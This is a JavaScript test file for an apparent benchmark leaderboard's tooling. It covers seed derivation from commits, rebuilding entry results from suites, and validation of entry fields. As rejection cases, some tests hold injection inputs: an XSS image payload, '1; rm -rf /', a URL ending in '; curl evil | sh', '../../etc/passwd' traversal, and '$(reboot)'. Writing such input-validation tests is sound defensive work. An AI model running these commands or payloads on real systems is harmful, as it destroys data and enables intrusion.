// The leaderboard's tools: a round's seeds (site/tools/round-seeds.mjs) and
// an entry's results from its suites (site/tools/entry-results.mjs).

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { PUBLIC_SEEDS, roundSeeds } from '../tools/round-seeds.mjs';
import { entryResults } from '../tools/entry-results.mjs';
import { entryFields, parseRef } from '../tools/entry-fields.mjs';

const COMMIT = '7db45ce8a08733ceff2a800fdf251429bceb2cbe';

test("a round's seeds come from its commit, and the rule does not drift", () => {
  // Fixed values: changing the rule would change every published round.
  assert.deepEqual(roundSeeds(COMMIT, 5), [35094317341517, 54986847123119, 86777117302663, 86838145417933, 241546336498955]);
  assert.deepEqual(roundSeeds('0'.repeat(40), 3), [33173155362357, 234145569620994, 240521979138080]);
  const seeds = roundSeeds(COMMIT);
  assert.equal(seeds.length, 50);
  assert.equal(new Set(seeds).size, 50);
  assert.ok(seeds.every((s) => Number.isSafeInteger(s) && s > PUBLIC_SEEDS && s < 2 ** 48));
  assert.deepEqual(seeds, [...seeds].sort((a, b) => a - b));
  // The same commit always gives the same seeds, and another commit others.
  assert.deepEqual(roundSeeds(COMMIT), seeds);
  const other = roundSeeds(COMMIT.replace(/^7/, '8'));
  assert.equal(other.filter((s) => seeds.includes(s)).length, 0);
});

test('seeds are only derived from a full commit hash', () => {
  for (const bad of ['main', 'v1.1.0', COMMIT.slice(0, 7), COMMIT.toUpperCase(), `${COMMIT}0`, '']) {
    assert.throws(() => roundSeeds(bad), /not a full commit hash/, bad);
  }
  assert.throws(() => roundSeeds(COMMIT, 0), /bad seed count/);
  assert.throws(() => roundSeeds(COMMIT, 5000), /bad seed count/);
});

/** A suite directory as `arcadiabench suite` writes it, rebuilt from a
 * published entry's files, under another coordinator name. */
function suiteFrom(entryDir, saidName) {
  const report = JSON.parse(readFileSync(join(entryDir, 'public/report.json'), 'utf8'));
  const runs = JSON.parse(readFileSync(join(entryDir, 'public/runs.json'), 'utf8'));
  const dir = mkdtempSync(join(tmpdir(), 'suite-'));
  const said = { name: saidName, version: '9.9' };
  const cards = report.scorecards.map((c) => ({ ...c, coordinator: said }));
  writeFileSync(join(dir, 'suite.json'), JSON.stringify({ scorecards: cards, resilience: report.resilience.map((r) => ({ ...r, coordinator: said })) }));
  for (const card of cards) {
    const name = card.scenario_id.replace('landing-pad-', '');
    mkdirSync(join(dir, name));
    const run = runs.scenarios[card.scenario_id] ?? { seeds: [1, 2], scores: [0.5, 0.5] };
    const lines = run.seeds.map((seed, i) => JSON.stringify({ scenario_id: card.scenario_id, variant: card.variant, seed, score: run.scores[i], coordinator: said }));
    writeFileSync(join(dir, name, 'metrics.jsonl'), `${lines.join('\n')}\n`);
  }
  return { dir, report, runs };
}

test("an entry's results are its suites, under the entry's own name", () => {
  const entryDir = new URL('../../leaderboard/entries/baseline-random/1.1.0/', import.meta.url).pathname;
  const entry = JSON.parse(readFileSync(join(entryDir, 'entry.json'), 'utf8'));
  // The coordinator called itself something else, with markup in it.
  const { dir, report, runs } = suiteFrom(entryDir, '<img src=x onerror=alert(1)>');
  const made = entryResults(entry, [dir]);
  assert.deepEqual(made.report, report);
  assert.deepEqual(made.runs, runs);
  assert.ok(made.report.scorecards.every((c) => c.coordinator.name === 'baseline-random' && c.coordinator.version === '1.1.0'));
  // Only the nominal scenarios' runs are kept.
  assert.deepEqual(Object.keys(made.runs.scenarios), ['landing-pad-1.1-large-nominal', 'landing-pad-1.1-medium-nominal', 'landing-pad-1.1-small-nominal']);
});

test('results that are not what a suite writes are refused', () => {
  const entryDir = new URL('../../leaderboard/entries/baseline-random/1.1.0/', import.meta.url).pathname;
  const entry = JSON.parse(readFileSync(join(entryDir, 'entry.json'), 'utf8'));
  const { dir } = suiteFrom(entryDir, 'x');
  const metrics = join(dir, '1.1-small-nominal', 'metrics.jsonl');
  const good = readFileSync(metrics, 'utf8');
  writeFileSync(metrics, good.replace('"score":0.', '"score":7.'));
  assert.throws(() => entryResults(entry, [dir]), /bad score/);
  writeFileSync(metrics, good.replace('"seed":1,', '"seed":"1; rm -rf /",'));
  assert.throws(() => entryResults(entry, [dir]), /bad seed/);
  writeFileSync(metrics, good);
  // The same scenario from two suites is a mistake, not a merge.
  assert.throws(() => entryResults(entry, [dir, dir]), /appears in two suites/);
  writeFileSync(join(dir, 'suite.json'), '{"scorecards":"all of them"}');
  assert.throws(() => entryResults(entry, [dir]), /is not a report/);
});

test('what the workflow reads of an entry is checked first', () => {
  const entry = JSON.parse(readFileSync(new URL('../../leaderboard/entries/baseline-greedy/1.1.0/entry.json', import.meta.url), 'utf8'));
  const f = entryFields(entry, parseRef('baseline-greedy/1.1.0'));
  assert.equal(f.repository, 'https://github.com/Gabe-Soler/arcadiabench');
  assert.match(f.commit, /^[0-9a-f]{40}$/);
  assert.equal(f.dockerfile, 'leaderboard/tools/dockerfiles/baseline-greedy.Dockerfile');
  assert.equal(f.tracks, 'standard,fleet');
  assert.equal(f.image_name, 'arcadiabench-entries');
  assert.equal(f.image_tag, 'baseline-greedy-1.1.0');
  assert.equal(f.dir, 'leaderboard/entries/baseline-greedy/1.1.0');
  assert.equal(f.image_digest, '');
  // The Dockerfile is the root one unless the entry names another.
  const plain = { ...entry, source: { repository: entry.source.repository, commit: entry.source.commit } };
  assert.equal(entryFields(plain).dockerfile, 'Dockerfile');

  const bad = (change, why) => assert.throws(() => entryFields(change(structuredClone(entry))), why);
  bad((e) => { e.source.repository = 'https://github.com/a/b; curl evil | sh'; return e; }, /repository/);
  bad((e) => { e.source.repository = 'git@github.com:a/b.git'; return e; }, /repository/);
  bad((e) => { e.source.commit = 'main'; return e; }, /commit/);
  bad((e) => { e.source.dockerfile = '../../etc/passwd'; return e; }, /dockerfile/);
  bad((e) => { e.source.dockerfile = '/abs/Dockerfile'; return e; }, /dockerfile/);
  bad((e) => { e.source.dockerfile = '-f evil'; return e; }, /dockerfile/);
  bad((e) => { e.id = 'x y'; return e; }, /id/);
  bad((e) => { e.tracks = ['standard', '$(reboot)']; return e; }, /tracks/);
  bad((e) => { e.image_digest = 'latest'; return e; }, /image_digest/);
  // An entry is the one its directory names.
  assert.throws(() => entryFields(entry, parseRef('baseline-random/1.1.0')), /the entry file says/);
  for (const ref of ['', 'a', 'a/b/c', '../x/1', 'ok/..', 'UPPER/1']) assert.throws(() => parseRef(ref), undefined, ref);
});
